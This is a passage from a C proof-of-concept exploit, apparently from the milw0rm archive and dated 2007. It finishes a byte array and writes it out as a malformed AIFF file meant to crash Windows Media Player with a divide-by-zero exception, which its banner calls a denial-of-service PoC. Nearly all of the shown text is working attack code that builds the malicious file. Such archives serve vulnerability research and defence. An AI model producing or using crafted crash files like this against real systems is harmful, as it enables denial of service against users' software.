	0xFC,0x94,0xFE,0xC7,0x00,0xEA,0x02,0xBB,0x04,0x0A,0x04,0xB7,
	0x04,0xBD,0x04,0x2B,0x03,0x23,0x01,0xCF,0x00,0x65,0xFF,0x19,
	0xFE,0x16,0xFD,0x7A,0xFD,0x53
};

int main()
{
	
	FILE *fp;

	int i;
	
	usage();
	
	if ((fp = fopen(AIFF_FILE, "w")) == NULL) {
                printf("File %s write error\n", AIFF_FILE);
                return 0;
	}

	for(i=0; i<sizeof(aiff); i++)
		fputc(aiff[i], fp);

	fclose(fp);

    return 0;
}

void usage(void) 
{
   printf("Windows Media Player AIFF Divide By Zero Exception DOS POC \n");
   printf("Proof of Concept by Hong Gil-Dong & Jeon Woo-chi \n"); 
}

// milw0rm.com [2007-11-29]
